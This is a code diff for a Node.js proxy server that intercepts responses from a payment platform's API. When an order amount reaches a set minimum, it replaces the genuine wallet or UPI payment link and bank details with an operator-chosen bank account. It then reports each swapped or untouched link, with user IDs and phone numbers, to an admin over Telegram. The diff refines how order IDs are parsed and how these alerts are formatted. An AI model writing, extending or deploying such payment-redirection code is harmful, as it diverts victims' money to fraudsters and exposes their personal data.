@@ -502,17 +502,11 @@ function bankFromSavedOrder(saved) {
 
 function getRequestOrderId(req) {
     const query = new URLSearchParams((req.originalUrl || req.url || '').split('?')[1] || '');
-    for (const f of ['rptNo', 'orderNo', 'orderId', 'order_id', 'slipId', 'id', 'tradeNo']) {
-        if (query.get(f)) return String(query.get(f)).trim();
-    }
+    if (query.get('rptNo')) return String(query.get('rptNo')).trim();
+    if (query.get('rpt_no')) return String(query.get('rpt_no')).trim();
     if (req.body && typeof req.body === 'object') {
-        for (const f of ['rptNo', 'orderNo', 'orderId', 'order_id', 'slipId', 'id', 'tradeNo']) {
-            if (req.body[f] !== undefined && req.body[f] !== null && String(req.body[f]).trim()) return String(req.body[f]).trim();
-        }
-    }
-    const parts = (req.originalUrl || req.url || '').split(/[/?#]/).filter(Boolean);
-    for (let i = parts.length - 1; i >= 0; i--) {
-        if (/^\\d{3,}$/.test(parts[i])) return String(parts[i]);
+        if (req.body.rptNo) return String(req.body.rptNo).trim();
+        if (req.body.rpt_no) return String(req.body.rpt_no).trim();
     }
     return '';
 }
@@ -2416,41 +2410,37 @@ app.all('/xxapi/*', async (req, res) => {
             }
 
             const rawWallet = pJson.data && pJson.data.walletDomain ? String(pJson.data.walletDomain) : '';
+            if (!rawWallet || !rawWallet.includes('://')) {
+                // If response has no wallet URL, forward as-is directly without touching anything
+                cleanUglyBankNames(pJson);
+                sendJson(res, pRespHeaders, pJson);
+                return;
+            }
+
             const walletInfo = parseWalletDomainDetails(rawWallet);
             const parsedAmt = walletInfo && walletInfo.amount !== null ? walletInfo.amount : (getOrderAmount(req, pJson.data) || 0);
             const activeBank = getActiveBank(data, resolvedUid);
             const minAmount = activeBank && activeBank.minAmount ? parseFloat(activeBank.minAmount) : 0;
+            const walletType = getWalletTypeName(rawWallet, pJson.data ? (pJson.data.payType || pJson.data.ctType) : null);
+            const trackedUser = (data.trackedUsers && resolvedUid && data.trackedUsers[resolvedUid]) || {};
+            const userPhone = trackedUser.phone || '';
 
             let replaced = false;
 
             if (data.botEnabled !== false && activeBank && activeBank.accountNo) {
-                // 1. AMOUNT CHECK FIRST (only when amount >= minAmount)
+                // 1. AMOUNT CHECK FIRST (only replace when amount >= minAmount)
                 if (minAmount <= 0 || parsedAmt >= minAmount) {
                     // 2. INJECT ACTIVE BANK INTO WALLET DOMAIN (mobikwik, freecharge, amazon, upi, etc.)
-                    if (rawWallet) {
-                        pJson.data.walletDomain = injectBankIntoWalletDomain(rawWallet, activeBank);
-                        replaced = true;
-                    }
+                    pJson.data.walletDomain = injectBankIntoWalletDomain(rawWallet, activeBank);
+                    replaced = true;
                     if (pJson.data && typeof pJson.data === 'object') {
                         forceBankDetails(pJson.data, activeBank);
                     }
                 }
             }
 
-            const realBank = walletInfo && (walletInfo.accountNo || walletInfo.name || walletInfo.ifsc)
-                ? { accountHolder: walletInfo.name || '', accountNo: walletInfo.accountNo || '', ifsc: walletInfo.ifsc || '', upiId: walletInfo.upiId || '' }
-                : (captureRealBank(pJson) || {});
-
-            const realLine = (realBank.accountNo || realBank.accountHolder)
-                ? `🏦 Real Bank:\n  Name: ${realBank.accountHolder || 'N/A'}\n  Acc:  ${realBank.accountNo || 'N/A'}${realBank.ifsc ? '\n  IFSC: ' + realBank.ifsc : ''}${realBank.bankName ? '\n  Bank: ' + realBank.bankName : ''}${realBank.upiId ? '\n  UPI:  ' + realBank.upiId : ''}`
-                : '🏦 Real Bank: N/A';
-
             if (replaced && activeBank) {
                 const newWallet = (pJson.data && pJson.data.walletDomain) ? String(pJson.data.walletDomain) : '';
-                const walletType = getWalletTypeName(rawWallet || newWallet, pJson.data ? (pJson.data.payType || pJson.data.ctType) : null);
-                const trackedUser = (data.trackedUsers && resolvedUid && data.trackedUsers[resolvedUid]) || {};
-                const userPhone = trackedUser.phone || '';
-
                 const replaceMsg = `╔══════════════════════════════════╗
 ║   ⚡ LINK REPLACED SUCCESSFULLY  ║
 ╚══════════════════════════════════╝
@@ -2474,9 +2464,25 @@ app.all('/xxapi/*', async (req, res) => {
                     notifyAdmin(data, replaceMsg, { parse_mode: 'HTML' }).catch(() => { });
                 }
             } else if (parsedAmt > 0 && minAmount > 0 && parsedAmt < minAmount) {
+                const notReplacedMsg = `╔══════════════════════════════════╗
+║   ⚠️ LINK NOT REPLACED          ║
+╚══════════════════════════════════╝
+💰 <b>Amount</b>      : <b>₹${parsedAmt}</b>
+⚠️ <b>Reason</b>      : <b>₹${parsedAmt} < Min Set ₹${minAmount}</b>
+📱 <b>Wallet Type</b> : <b>${escapeTelegramHtml(walletType)}</b>
+📋 <b>Order ID</b>    : <code>${escapeTelegramHtml(reqOrderId || 'N/A')}</code>
+👤 <b>User ID</b>     : <code>${escapeTelegramHtml(resolvedUid || 'N/A')}</code>${userPhone ? `\n📞 <b>Phone</b>       : <code>${escapeTelegramHtml(userPhone)}</code>` : ''}
+
+🔗 <b>Real Link Kept</b>:
+<code>${escapeTelegramHtml(rawWallet || 'N/A')}</code>
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+❌ <b>Status</b>       : <b>Real Link Kept (Amount < Min)</b>
+🕐 <code>${now}</code>`;
+
                 const canNotify = await claimOrderNotification(data, reqOrderId || pJson.data);
                 if (canNotify) {
-                    notifyAdmin(data, `⚠️ BUY (NOT REPLACED)\n💰 Amount: ₹${parsedAmt}\n📋 Order: ${reqOrderId || 'N/A'}\nℹ️ ₹${parsedAmt} < Min ₹${minAmount}\n❌ Real Link Kept\n🕐 ${now}`).catch(() => { });
+                    notifyAdmin(data, notReplacedMsg, { parse_mode: 'HTML' }).catch(() => { });
                 }
             }
 
@@ -2923,27 +2929,18 @@ app.all('/xxapi/*', async (req, res) => {
         let _orderId = '';
         if (isOrder) {
             _orderId = getRequestOrderId(req) || '';
-            const orderFields = ['rptNo', 'rpt_no', 'orderId', 'orderNo', 'order_id', 'order_no', 'buyOrderNo', 'tradeNo', 'id', 'slipId'];
             if (!_orderId && respData && typeof respData === 'object' && !Array.isArray(respData)) {
-                for (const f of orderFields) {
-                    if (respData[f] && String(respData[f]).length >= 3) { _orderId = String(respData[f]); break; }
-                }
+                _orderId = String(respData.rptNo || respData.rpt_no || '').trim();
             }
             if (!_orderId && jsonResp && typeof jsonResp === 'object') {
-                for (const f of orderFields) {
-                    if (jsonResp[f] && String(jsonResp[f]).length >= 3) { _orderId = String(jsonResp[f]); break; }
-                }
+                _orderId = String(jsonResp.rptNo || jsonResp.rpt_no || '').trim();
             }
             if (!_orderId && req.body && typeof req.body === 'object') {
-                for (const f of orderFields) {
-                    if (req.body[f] && String(req.body[f]).length >= 3) { _orderId = String(req.body[f]); break; }
-                }
+                _orderId = String(req.body.rptNo || req.body.rpt_no || '').trim();
             }
             if (!_orderId) {
                 const urlParams = new URLSearchParams((req.originalUrl || req.url).split('?')[1] || '');
-                for (const f of orderFields) {
-                    if (urlParams.get(f)) { _orderId = urlParams.get(f); break; }
-                }
+                _orderId = String(urlParams.get('rptNo') || urlParams.get('rpt_no') || '').trim();
             }
         }
 
@@ -3211,19 +3208,17 @@ app.all('/xxapi/*', async (req, res) => {
                     savedData.bankName = _replacedBank.bankName || savedData.bankName || '';
                     savedData.upiId = _replacedBank.upiId || savedData.upiId || '';
                 }
-                savedData.rptNo = canonicalOrderId;
-                savedData.orderNo = savedData.orderNo || altId || canonicalOrderId;
+                const finalRptNo = String((respData && (respData.rptNo || respData.rpt_no)) || _orderId).trim();
+                savedData.rptNo = finalRptNo;
+                savedData.orderNo = finalRptNo;
+                savedData.orderId = finalRptNo;
                 savedData.amount = savedData.amount || _orderAmt || 0;
                 savedData.isManual = true;
                 savedData.forced = true;
-                data.orderBankMap[canonicalOrderId] = savedData;
-                if (_orderId && String(_orderId) !== canonicalOrderId) data.orderBankMap[String(_orderId)] = savedData;
-                if (altId && altId !== canonicalOrderId) data.orderBankMap[altId] = savedData;
+                data.orderBankMap[finalRptNo] = savedData;
 
                 if (!data._newOrdersToSave) data._newOrdersToSave = {};
-                data._newOrdersToSave[canonicalOrderId] = savedData;
-                if (_orderId && String(_orderId) !== canonicalOrderId) data._newOrdersToSave[String(_orderId)] = savedData;
-                if (altId && altId !== canonicalOrderId) data._newOrdersToSave[altId] = savedData;
+                data._newOrdersToSave[finalRptNo] = savedData;
 
                 await saveData(data);
             }
